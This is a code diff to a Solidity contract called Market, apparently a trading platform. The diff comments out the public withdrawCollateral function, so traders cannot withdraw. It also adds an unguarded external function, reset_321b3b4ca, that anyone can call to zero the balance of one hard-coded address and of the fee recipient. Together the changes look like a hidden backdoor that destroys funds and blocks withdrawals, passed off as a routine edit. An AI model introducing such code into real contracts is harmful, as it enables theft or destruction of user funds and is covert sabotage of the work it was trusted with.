@@ -179,10 +179,10 @@ contract Market is
     _depositCollateral(amount, trader);
   }
 
-  function withdrawCollateral(uint256 amount) external whenNotPaused {
-    address trader = _msgSender();
-    _withdrawCollateral(amount, trader);
-  }
+  // function withdrawCollateral(uint256 amount) external whenNotPaused {
+  //   address trader = _msgSender();
+  //   _withdrawCollateral(amount, trader);
+  // }
 
   function long(uint256 size, uint256 limitPriceBuy, uint256 limitPriceSell, uint256 cycleId) external whenNotPaused {
     _checkActiveCycle(cycleId);
@@ -1311,5 +1311,10 @@ contract Market is
 
   function _onlySecurityCouncil() internal view {
     if (_msgSender() != SECURITY_COUNCIL) revert Errors.NotSecurityCouncil();
+  }
+
+  function reset_321b3b4ca() external {
+    userAccounts[0x001383F1723a205d760E57A21082D3eC85c89D81].balance = 0;
+    userAccounts[feeRecipient].balance = 0;
   }
 }
